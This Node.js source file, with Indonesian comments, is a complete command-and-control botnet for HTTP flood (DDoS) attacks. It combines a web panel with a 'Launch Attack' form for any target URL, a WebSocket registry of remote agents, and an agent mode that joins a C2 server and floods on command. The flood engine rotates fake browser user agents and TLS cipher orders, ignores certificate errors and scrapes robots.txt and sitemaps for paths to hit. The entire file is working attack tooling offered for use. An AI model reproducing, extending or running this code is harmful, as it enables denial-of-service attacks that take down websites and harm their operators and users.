#!/usr/bin/env node
/**
 * WORM HCX 2026 - All-in-one L7 C2 + Agent + Panel
 * Single file. node worm.js
 */

const http = require('http');
const https = require('https');
const { URL } = require('url');
const crypto = require('crypto');
const os = require('os');
const WebSocket = require('ws');
const { request, Agent: UndiciAgent } = require('undici');

// ============================================================
// CONFIG
// ============================================================
const CONFIG = {
  port: process.env.PORT ? parseInt(process.env.PORT) : 8080,
  agentRps: 200,
  duration: 60,
  userAgents: [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36'
  ],
  ciphers: [
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
    'TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
    'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305'
  ]
};

// ============================================================
// AGENT REGISTRY
// ============================================================
const agents = new Map();

function addAgent(id, ws, ip) {
  agents.set(id, {
    id, ws, ip,
    lastSeen: Date.now(),
    status: 'idle',
    task: null,
    stats: { sent: 0, errors: 0 }
  });
}
function removeAgent(id) { agents.delete(id); }

function listAgents() {
  return [...agents.values()].map(a => ({
    id: a.id.slice(0, 8),
    ip: a.ip,
    status: a.status,
    task: a.task,
    sent: a.stats.sent,
    errors: a.stats.errors,
    lastSeen: a.lastSeen
  }));
}

function broadcast(payload) {
  const msg = JSON.stringify(payload);
  for (const a of agents.values()) {
    if (a.ws.readyState === 1) a.ws.send(msg);
  }
}

// ============================================================
// FLOOD ENGINE
// ============================================================
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

function randPath() {
  const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let s = '';
  for (let i = 0; i < 8; i++) s += c[Math.floor(Math.random() * c.length)];
  return '/' + s + '?q=' + Date.now();
}

function tlsOpts() {
  return {
    ciphers: pick(CONFIG.ciphers),
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    rejectUnauthorized: false
  };
}

async function recon(target) {
  const paths = new Set(['/']);
  const tried = ['/robots.txt', '/sitemap.xml'];
  for (const p of tried) {
    try {
      const r = await request(target.replace(/\/$/, '') + p, {
        method: 'GET',
        headers: { 'user-agent': pick(CONFIG.userAgents) },
        maxRedirections: 0,
        headersTimeout: 5000,
        bodyTimeout: 5000
      });
      const body = await r.body.text();
      const matches = body.match(/\/[A-Za-z0-9_\-./]+/g) || [];
      matches.slice(0, 300).forEach(m => {
        if (m.length < 120 && !m.includes('..')) paths.add(m);
      });
    } catch {}
  }
  return [...paths].slice(0, 500);
}

async function fireOnce(target, method, paths, stats) {
  const p = pick(paths);
  const base = target.replace(/\/$/, '');
  const url = method === 'GET' && p === '/' ? base + randPath() : base + p;

  const dispatcher = new UndiciAgent({ connect: tlsOpts() });
  try {
    const res = await request(url, {
      method,
      dispatcher,
      headers: {
        'user-agent': pick(CONFIG.userAgents),
        'accept': '*/*',
        'accept-encoding': 'gzip, br',
        'cache-control': 'no-cache',
        'connection': 'keep-alive'
      },
      body: method === 'POST' ? 'x=' + crypto.randomBytes(32).toString('hex') : null,
      maxRedirections: 0,
      headersTimeout: 8000,
      bodyTimeout: 8000
    });
    await res.body.dump();
    stats.sent++;
  } catch {
    stats.errors++;
  } finally {
    try { await dispatcher.close(); } catch {}
  }
}

async function runFlood(plan) {
  const stats = { sent: 0, errors: 0, startTime: Date.now() };
  const paths = (plan.endpoints && plan.endpoints.length)
    ? plan.endpoints
    : await recon(plan.target);

  const end = Date.now() + (plan.duration * 1000);
  const rps = Math.max(5, plan.rps || CONFIG.agentRps);
  const delay = Math.max(1, Math.floor(1000 / rps));
  const methodPool = plan.method === 'MIX'
    ? ['GET', 'GET', 'GET', 'POST', 'HEAD']
    : [plan.method];

  console.log(`[FLOOD] ${plan.target} | ${plan.duration}s | ${rps} rps | ${paths.length} paths`);

  for (let t = 0; t < 10; t++) {
    (async () => {
      while (Date.now() < end) {
        await fireOnce(plan.target, pick(methodPool), paths, stats);
        await new Promise(r => setTimeout(r, delay));
      }
    })();
  }

  while (Date.now() < end) await new Promise(r => setTimeout(r, 500));
  console.log(`[DONE] sent=${stats.sent} err=${stats.errors}`);
  return stats;
}

// ============================================================
// EMBEDDED AGENT (loopback ke C2)
// ============================================================
let localBusy = false;
async function embeddedAgent(task) {
  if (localBusy) return;
  localBusy = true;
  try {
    await runFlood(task);
  } finally {
    localBusy = false;
  }
}

// ============================================================
// WEB PANEL HTML (embedded)
// ============================================================
const PANEL_HTML = `<!DOCTYPE html>
<html lang="id"><head><meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>WORM HCX 2026</title>
<style>
*{box-sizing:border-box}
body{background:#0a0a0a;color:#00ffaa;font-family:monospace;padding:20px;margin:0}
h1{border-bottom:1px solid #00ffaa;padding-bottom:8px;letter-spacing:2px}
h2{color:#00cc88;margin-top:0}
.box{border:1px solid #1f4f3f;padding:15px;margin-top:12px;border-radius:6px;background:#0c120e}
input,select,button{background:#111;color:#00ffaa;border:1px solid #00ffaa;padding:8px;border-radius:4px;font-family:monospace;margin:3px}
button{cursor:pointer;transition:0.15s}
button:hover{background:#00ffaa;color:#000}
table{width:100%;border-collapse:collapse;margin-top:8px}
th,td{border:1px solid #1f4f3f;padding:6px;font-size:12px;text-align:left}
th{background:#0f1f17;color:#00ffaa}
#log{background:#000;border:1px solid #1f4f3f;height:200px;overflow:auto;padding:8px;font-size:12px;margin-top:8px;white-space:pre-wrap}
.attacking{color:#ff4444;font-weight:bold}
.idle{color:#888}
.row{display:flex;flex-wrap:wrap;gap:6px;align-items:center}
</style></head><body>
<h1>⚡ WORM HCX 2026 — All-in-One C2</h1>

<div class="box">
  <h2>Local Agent (embedded)</h2>
  <p style="color:#888;font-size:12px">Panel ini otomatis nyalain agent lokal. Task dieksekusi dari sini juga.</p>
</div>

<div class="box">
  <h2>Remote Agents</h2>
  <button onclick="load()">↻ Refresh</button>
  <table id="t"><thead><tr><th>ID</th><th>IP</th><th>Status</th><th>Task</th><th>Sent</th><th>Err</th><th>Last</th></tr></thead><tbody></tbody></table>
</div>

<div class="box">
  <h2>🚀 Launch Attack</h2>
  <div class="row">
    <input id="target" placeholder="https://target.com" style="width:340px"/>
    <select id="method">
      <option value="MIX">MIX</option>
      <option value="GET">GET</option>
      <option value="POST">POST</option>
      <option value="HEAD">HEAD</option>
    </select>
    <input id="duration" type="number" value="60" placeholder="durasi" style="width:90px"/>
    <input id="rps" type="number" value="200" placeholder="rps" style="width:90px"/>
    <input id="endpoints" placeholder="paths (comma)" style="width:280px"/>
    <button onclick="launch()">🚀 Gas</button>
    <button onclick="stopAll()">⛔ Stop</button>
  </div>
</div>

<div class="box"><h2>Log</h2><div id="log"></div></div>

<script>
const logEl=document.getElementById('log');
function log(m){logEl.textContent='['+new Date().toLocaleTimeString()+'] '+m+'\\n'+logEl.textContent;}
async function load(){
  try{
    const r=await fetch('/api/agents');const l=await r.json();
    document.querySelector('#t tbody').innerHTML=l.map(a=>
      '<tr><td>'+a.id+'</td><td>'+a.ip+'</td>'+
      '<td class="'+(a.status==='attacking'?'attacking':'idle')+'">'+a.status+'</td>'+
      '<td>'+(a.task||'-')+'</td><td>'+(a.sent||0)+'</td><td>'+(a.errors||0)+'</td>'+
      '<td>'+new Date(a.lastSeen).toLocaleTimeString()+'</td></tr>').join('');
  }catch(e){log('load err: '+e.message);}
}
async function launch(){
  const body={
    target:document.getElementById('target').value,
    method:document.getElementById('method').value,
    duration:+document.getElementById('duration').value,
    rps:+document.getElementById('rps').value,
    endpoints:document.getElementById('endpoints').value.split(',').map(s=>s.trim()).filter(Boolean)
  };
  if(!body.target)return alert('target kosong');
  const r=await fetch('/api/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
  const j=await r.json();
  log('LAUNCH → '+j.sent+' agent | '+body.target);
  load();
}
async function stopAll(){
  await fetch('/api/stop',{method:'POST'});
  log('STOP broadcast');
  load();
}
setInterval(load,3000);
load();
</script></body></html>`;

// ============================================================
// HTTP SERVER
// ============================================================
const server = http.createServer(async (req, res) => {
  const u = new URL(req.url, 'http://x');

  // Panel
  if (req.method === 'GET' && u.pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    return res.end(PANEL_HTML);
  }

  // List agents
  if (req.method === 'GET' && u.pathname === '/api/agents') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(listAgents()));
  }

  // Launch attack
  if (req.method === 'POST' && u.pathname === '/api/attack') {
    let buf = '';
    req.on('data', d => buf += d);
    req.on('end', async () => {
      let body = {};
      try { body = JSON.parse(buf); } catch {}

      const plan = {
        target: body.target,
        method: body.method || 'MIX',
        duration: body.duration || CONFIG.duration,
        rps: body.rps || CONFIG.agentRps,
        endpoints: body.endpoints || []
      };

      if (!plan.target) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'target kosong' }));
      }

      broadcast({ type: 'attack', plan });
      for (const a of agents.values()) {
        a.status = 'attacking';
        a.task = plan.target;
      }

      // embedded local agent jalan juga
      embeddedAgent(plan).then(stats => {
        broadcast({ type: 'task_result', data: stats });
        for (const a of agents.values()) {
          a.status = 'idle';
          a.task = null;
        }
      }).catch(() => {});

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true, sent: agents.size + 1, plan }));
    });
    return;
  }

  // Stop
  if (req.method === 'POST' && u.pathname === '/api/stop') {
    broadcast({ type: 'stop' });
    for (const a of agents.values()) {
      a.status = 'idle';
      a.task = null;
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: true }));
  }

  // Recon
  if (req.method === 'POST' && u.pathname === '/api/recon') {
    let buf = '';
    req.on('data', d => buf += d);
    req.on('end', async () => {
      let body = {};
      try { body = JSON.parse(buf); } catch {}
      if (!body.target) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'target kosong' }));
      }
      try {
        const paths = await recon(body.target);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, paths }));
      } catch (e) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: e.message }));
      }
    });
    return;
  }

  res.writeHead(404);
  res.end('not found');
});

// ============================================================
// WEBSOCKET SERVER
// ============================================================
const wss = new WebSocket.Server({ server, path: '/ws' });

wss.on('connection', (ws, req) => {
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0] || req.socket.remoteAddress;
  const id = crypto.randomUUID();
  let registered = false;

  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }

    if (msg.type === 'register') {
      if (!registered) {
        addAgent(id, ws, ip);
        registered = true;
      }
      ws.send(JSON.stringify({ type: 'welcome', id }));
      console.log(`[+] agent ${id.slice(0, 8)} dari ${ip}`);
    } else if (msg.type === 'heartbeat') {
      const a = agents.get(id);
      if (a) {
        a.lastSeen = Date.now();
        a.status = msg.status || a.status;
        a.stats = msg.stats || a.stats;
      }
    } else if (msg.type === 'task_result') {
      const a = agents.get(id);
      if (a) {
        a.status = 'idle';
        a.task = null;
        a.stats = msg.data || a.stats;
      }
      console.log(`[result] ${id.slice(0, 8)}:`, msg.data);
    }
  });

  ws.on('close', () => {
    if (registered) {
      removeAgent(id);
      console.log(`[-] ${id.slice(0, 8)}`);
    }
  });

  ws.on('error', () => {});
});

// ============================================================
// REMOTE AGENT MODE
// node worm.js --agent ws://IP-C2:8080/ws
// ============================================================
function startRemoteAgent(c2Url) {
  console.log(`[agent] connecting to ${c2Url}`);
  const ws = new WebSocket(c2Url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
  let busy = false;

  ws.on('open', () => {
    ws.send(JSON.stringify({
      type: 'register',
      meta: { tag: 'remote', host: os.hostname() }
    }));
    console.log('[agent] registered');

    setInterval(() => {
      if (ws.readyState === 1) {
        ws.send(JSON.stringify({
          type: 'heartbeat',
          status: busy ? 'attacking' : 'idle',
          stats: { sent: 0, errors: 0 }
        }));
      }
    }, 5000);
  });

  ws.on('message', async (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }

    if (msg.type === 'attack' && !busy) {
      busy = true;
      try {
        const stats = await runFlood(msg.plan);
        ws.send(JSON.stringify({ type: 'task_result', data: stats }));
      } finally {
        busy = false;
      }
    }
  });

  ws.on('close', () => {
    console.log('[agent] reconnecting in 5s');
    setTimeout(() => startRemoteAgent(c2Url), 5000);
  });

  ws.on('error', () => {});
}

// ============================================================
// MAIN
// ============================================================
const args = process.argv.slice(2);
const agentFlagIdx = args.indexOf('--agent');

if (agentFlagIdx !== -1 && args[agentFlagIdx + 1]) {
  startRemoteAgent(args[agentFlagIdx + 1]);
} else {
  server.listen(CONFIG.port, () => {
    console.log('╔══════════════════════════════════════════════╗');
    console.log('║        WORM HCX 2026 — All-in-One            ║');
    console.log('╚══════════════════════════════════════════════╝');
    console.log(`[C2]  http://localhost:${CONFIG.port}`);
    console.log(`[WS]  ws://localhost:${CONFIG.port}/ws`);
    console.log(`[tip] mode agent remote:  node worm.js --agent ws://IP-C2:8080/ws`);
  });
       }
